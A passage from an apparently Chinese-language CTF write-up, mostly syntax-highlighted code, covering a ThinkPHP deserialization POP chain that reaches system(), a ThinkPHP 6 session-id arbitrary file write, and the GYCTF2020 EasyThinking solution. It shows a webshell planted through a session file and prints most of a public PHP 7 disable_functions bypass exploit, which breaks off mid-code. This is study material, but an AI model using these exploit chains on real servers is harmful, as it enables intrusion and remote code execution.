class_">Request</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filter</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hook[<span class="string">&#x27;visible&#x27;</span>] = [<span class="variable language_">$this</span>, <span class="string">&#x27;isAjax&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0st-9/images/main/image/1.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">)</p><h1 id="ThinkPHP6ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´åˆ†æ"><a href="#ThinkPHP6ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´åˆ†æ" class="headerlink" title="ThinkPHP6ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´åˆ†æ"></a>ThinkPHP6ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´åˆ†æ</h1><h2 id="ç¯å¢ƒæ­å»º-2"><a href="#ç¯å¢ƒæ­å»º-2" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p><strong>phpstudy+thinkphp(&lt;&#x3D;6.0.0ç‰ˆæœ¬&lt;&#x3D;6.0.2) + php7ä»¥ä¸Š</strong></p><p>thinkphp6åªèƒ½åˆ©ç”¨composerä¸‹è½½ï¼Œå‚è€ƒ<a href="https://gh0st-9.github.io/2021/11/26/Windows%E4%B8%8Bphpstudy%E5%AE%89%E8%A3%85composer%E5%8F%8A%E5%85%B6thinkphp%E5%90%84%E7%89%88%E6%9C%AC/">æ–‡ç« </a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think=<span class="number">6.0</span>.<span class="number">0</span> tp6.<span class="number">0</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/c5e2cc1ae0fd473ca97982f102884e00.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä¸‹è½½å®Œæˆåè®¿é—®**localhost&#x2F;tp6.0&#x2F;public&#x2F;**ç”Ÿæ•ˆ</p><p>è‡³æ­¤ç¯å¢ƒæ­å»ºå®Œæ¯•</p><h2 id="æ¼æ´å‰–æ"><a href="#æ¼æ´å‰–æ" class="headerlink" title="æ¼æ´å‰–æ"></a>æ¼æ´å‰–æ</h2><p><strong>é¦–å…ˆçœ‹çœ‹å®˜æ–¹ä¿¡æ¯</strong></p><p><img src="https://img-blog.csdnimg.cn/9d4de9bfdf034c5ea249d2036b47e81f.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å¯ä»¥çœ‹åˆ°å®˜æ–¹å¯¹<strong>src&#x2F;think&#x2F;session&#x2F;Store.php</strong>ä¸­åœ¨<strong>id</strong>è®¾ç½®æ—¶å¤šå¢åŠ äº†ä¸€ä¸ªå‡½æ•°ï¼Œå› æ­¤çŒœæµ‹å¯èƒ½æ˜¯åœ¨å­˜å‚¨<strong>Session</strong>æ—¶å¯¼è‡´äº†æ–‡ä»¶å†™å…¥</p><p>æ‰€ä»¥æˆ‘ä»¬æ¥åˆ°<strong>vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;session&#x2F;Store.php</strong>ï¼Œå¯¹<strong>save()<strong>æ–¹æ³•ä¸­çš„</strong>write</strong>å‡½æ•°è¿›è¡Œè·Ÿè¸ª</p><p><img src="https://img-blog.csdnimg.cn/924c83fdacbc41299a34847e9ca58e1a.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><strong>vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;session&#x2F;driver&#x2F;File.php</strong></p><p><img src="https://img-blog.csdnimg.cn/cb8762317b604f2cad0ed0e8557a6d5d.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>åˆè°ƒç”¨äº†<strong>writeFile</strong>å‡½æ•°ï¼Œè·Ÿè¿›</p><p><strong>vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;session&#x2F;driver&#x2F;File.php</strong></p><p><img src="https://img-blog.csdnimg.cn/03337613909c45b1af80ad7f6eabfc44.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å‘ç°<strong>file_put_contents</strong>å‡½æ•°ï¼Œæœç„¶æ˜¯èƒ½å†™å…¥æ–‡ä»¶çš„æ“ä½œ</p><p>åå‘åˆ†æä¸€ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$path</span>,<span class="variable">$content</span>,LOCK_EX)ä¸­çš„å‚æ•°<span class="variable">$path</span>,<span class="variable">$content</span>æ¥æºäº<span class="title function_ invoke__">writeFile</span>(<span class="variable">$path</span>,<span class="variable">$data</span>)</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">writeFile</span>(<span class="variable">$path</span>,<span class="variable">$data</span>)ä¸­çš„å‚æ•°<span class="variable">$path</span>,<span class="variable">$data</span>æ¥æºäº<span class="title function_ invoke__">write</span>(String <span class="variable">$sessID</span>,String <span class="variable">$sessData</span>)</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">write</span>(String <span class="variable">$sessID</span>,String <span class="variable">$sessData</span>)ä¸­çš„å‚æ•°<span class="variable">$sessID</span>,<span class="variable">$sessData</span>æ¥æºäº<span class="title function_ invoke__">save</span>()ä¸­è°ƒç”¨äº†<span class="title function_ invoke__">write</span>()</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æœ€ç»ˆæ¨å¯¼å‡ºæ–‡ä»¶åå°±æ˜¯æ¥è‡ªäº<strong>getId()<strong>å¾—åˆ°çš„</strong>$sessionId</strong>çš„å€¼</p><p><img src="https://img-blog.csdnimg.cn/09b30c1622f54c8e871db7785a1352b5.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç»“åˆ<strong>setId</strong>å’Œ<strong>getId</strong>ï¼Œå‘ç°:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å½“ä¼ å…¥çš„idå€¼é•¿åº¦ä¸º32æ—¶ï¼Œåˆ›å»ºsessionIdï¼Œç„¶åè¿›è¡ŒgitId()</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæ¥ä¸‹æ¥å°±åº”å¯»æ‰¾è°ƒç”¨<strong>setID</strong>çš„åœ°æ–¹ï¼Œå‘ç°åœ¨<strong>vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;middleware&#x2F;SessionInit.php</strong></p><p><img src="https://img-blog.csdnimg.cn/4bcc5b283d744104bc0bf3a283135d0b.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å¯¹è¿™é‡Œçš„<strong>getName</strong>è¿›è¡Œè¿½è¸ªå‘ç°ï¼Œ**$cookieName**&#x3D;<strong>PHPSESSID</strong></p><p><img src="https://img-blog.csdnimg.cn/232af69eba7c4ac497f476c9bbd72041.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è€Œ**$sessionId**<code>æ˜¯</code><strong>cookie</strong>ä¸­åä¸º<strong>PHPSESSID</strong>çš„å€¼ï¼Œå› ä¸º<strong>sessionId</strong>æ˜¯æ”»å‡»è€…å¯æ§çš„ï¼Œä»è€Œå¯¼è‡´å†™å…¥çš„æ–‡ä»¶åå¯æ§</p><p>è€Œå†™å…¥çš„å†…å®¹æ˜¯åˆ›å»º<strong>session</strong>ä½¿ç”¨çš„å†…å®¹ã€‚ä½†æ˜¯<strong>session</strong>çš„å†…å®¹æ˜¯ç”±å®é™…çš„åç«¯ä¸šåŠ¡é€»è¾‘æ¥å†³å®šçš„ï¼Œå†µä¸”é»˜è®¤ç¯å¢ƒä¸‹å¹¶æ²¡æœ‰åˆ›å»º<strong>session</strong>ã€‚å› æ­¤ï¼Œé»˜è®¤ç¯å¢ƒä¸‹æ— æ³•åšåˆ°ä»»æ„æ–‡ä»¶å†™å…¥ã€‚æƒ³è¦åšåˆ°ä»»æ„æ–‡ä»¶å†™å…¥çš„æ¡ä»¶æ˜¯éå¸¸è‹›åˆ»çš„</p><p>å¦‚æœè¦getshellçš„è¯ï¼Œåç«¯éœ€è¦æœ‰ç±»ä¼¼çš„<code>Session::Set(&#39;name&#39;,$_POST[&#39;abc&#39;])</code>ä»£ç æ‰å¯ä»¥å®ç°</p><p>åŒæ—¶ï¼Œåœ¨è¿›è¡Œæ·±å…¥åˆ†æåï¼Œå‘ç°è¿˜å¯ä»¥å®ç°<strong>ä»»æ„æ–‡ä»¶åˆ é™¤</strong>ï¼Œä¸”æ–‡ä»¶åˆ é™¤å¯¹åç«¯ä¸šåŠ¡é€»è¾‘ä¾èµ–è¾ƒä½ã€‚</p><h2 id="ä¾‹é¢˜å®æ“-1"><a href="#ä¾‹é¢˜å®æ“-1" class="headerlink" title="ä¾‹é¢˜å®æ“"></a>ä¾‹é¢˜å®æ“</h2><h3 id="GYCTF2020-EasyThinking"><a href="#GYCTF2020-EasyThinking" class="headerlink" title="[GYCTF2020]EasyThinking"></a>[GYCTF2020]EasyThinking</h3><p>è¿™é‡Œé€šè¿‡<strong>dirsearch</strong>è¿›è¡Œç›®å½•æ‰«æèƒ½è·å–åˆ°<strong><a href="http://www.zip/">www.zip</a></strong>ä¸‹è½½å³å¯è·å¾—æºç ï¼Œè¿™é‡Œå°±ä¸åˆ†æäº†ï¼Œå°±æ˜¯åˆ©ç”¨ä¸Šé¢çš„æ¼æ´å˜åŒ–å‡ºæ¥çš„</p><p>å¯åŠ¨é¢˜ç›®ï¼Œåœ¨æ³¨å†Œè´¦å·ç™»é™†æ—¶ï¼Œç”¨bpæˆªåŒ…ï¼Œå°†sessioné•¿åº¦æ”¹ä¸º32ä½çš„phpæ–‡ä»¶</p><p><img src="https://img-blog.csdnimg.cn/5b43cf46dcc3437fb89baed6c266e4fb.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä¹‹åç™»å½•ï¼Œè¿›å…¥æœç´¢ç•Œé¢ï¼Œå†™å…¥ä¸€å¥è¯æœ¨é©¬</p><p><img src="https://img-blog.csdnimg.cn/d6628d9b9af64342b0a1fc86a5056c5e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç‚¹å‡»æœç´¢åï¼Œä¾¿æˆåŠŸå†™å…¥ï¼Œ</p><p><strong>è¿™é‡Œç®€å•è¯´ä¸€ä¸‹</strong>ï¼Œå› ä¸ºå‘ç°ç½‘ä¸Šå…³äºä¸ºä»€ä¹ˆåœ¨æœç´¢æ¡†å¤„å†™å…¥æœ¨é©¬éƒ½æ²¡æœ‰ä»‹ç»</p><p>ä¸‹è½½æºç åï¼Œå‘ç°</p><p><strong>app\home\controller\Member.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">search</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">Request</span>::<span class="title function_ invoke__">isPost</span>())&#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">session</span>(<span class="string">&#x27;?UID&#x27;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;/home/member/login&#x27;</span>);            </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$data</span> = <span class="title function_ invoke__">input</span>(<span class="string">&quot;post.&quot;</span>);</span><br><span class="line">            <span class="variable">$record</span> = <span class="title function_ invoke__">session</span>(<span class="string">&quot;Record&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">session</span>(<span class="string">&quot;Record&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="title function_ invoke__">session</span>(<span class="string">&quot;Record&quot;</span>,<span class="variable">$data</span>[<span class="string">&quot;key&quot;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$recordArr</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;,&quot;</span>,<span class="variable">$record</span>);</span><br><span class="line">                <span class="variable">$recordLen</span> = <span class="title function_ invoke__">sizeof</span>(<span class="variable">$recordArr</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$recordLen</span> &gt;= <span class="number">3</span>)&#123;</span><br><span class="line">                    <span class="title function_ invoke__">array_shift</span>(<span class="variable">$recordArr</span>);</span><br><span class="line">                    <span class="title function_ invoke__">session</span>(<span class="string">&quot;Record&quot;</span>,<span class="title function_ invoke__">implode</span>(<span class="string">&quot;,&quot;</span>,<span class="variable">$recordArr</span>) . <span class="string">&quot;,&quot;</span> . <span class="variable">$data</span>[<span class="string">&quot;key&quot;</span>]);</span><br><span class="line">                    <span class="keyword">return</span> <span class="title class_">View</span>::<span class="title function_ invoke__">fetch</span>(<span class="string">&quot;result&quot;</span>,[<span class="string">&quot;res&quot;</span> =&gt; <span class="string">&quot;There&#x27;s nothing here&quot;</span>]);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">session</span>(<span class="string">&quot;Record&quot;</span>,<span class="variable">$record</span> . <span class="string">&quot;,&quot;</span> . <span class="variable">$data</span>[<span class="string">&quot;key&quot;</span>]);</span><br><span class="line">            <span class="keyword">return</span> <span class="title class_">View</span>::<span class="title function_ invoke__">fetch</span>(<span class="string">&quot;result&quot;</span>,[<span class="string">&quot;res&quot;</span> =&gt; <span class="string">&quot;There&#x27;s nothing here&quot;</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">View</span>(<span class="string">&quot;search&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„<strong>searchå‡½æ•°ä¼šæŠŠæœç´¢æ¡†POSTæ•°æ®å­˜åˆ°sessionæ–‡ä»¶é‡Œé¢</strong></p><p>æ–‡ä»¶è·¯å¾„æ˜¯<br><code>runtime/session/sess_123456789123456789123456789a.php</code></p><p>ç”¨èšå‰‘è¿æ¥</p><p>åœ¨æ ¹ç›®å½•ä¸‹å‘ç°<strong>flag</strong></p><p><img src="https://img-blog.csdnimg.cn/b7ba6cc0a46e4c05a9fcf022d65ef6a6.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä½†æ˜¯è¿˜éœ€æ‰§è¡Œ<strong>readflag</strong>æ‰èƒ½è·å–</p><p>è¿™é‡Œç›´æ¥ä¸Š<strong>github</strong>ä¸Šçš„è„šæœ¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP 7.0-7.4 disable_functions bypass PoC (*nix only)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Bug: https://bugs.php.net/bug.php?id=76047</span></span><br><span class="line"><span class="comment"># debug_backtrace() returns a reference to a variable </span></span><br><span class="line"><span class="comment"># that has been destroyed, causing a UAF vulnerability.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This exploit should work on all PHP 7.0-7.4 versions</span></span><br><span class="line"><span class="comment"># released as of 30/01/2020.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">pwn</span>(<span class="string">&quot;/readflag&quot;</span>); <span class="comment">//å°†è¿™é‡Œçš„å‘½ä»¤æ”¹æˆ/readflagå³å¯</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>(); <span class="comment"># ;)</span></span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123; <span class="comment"># PHP &gt;= 7.4</span></span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">chr</span>(<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span 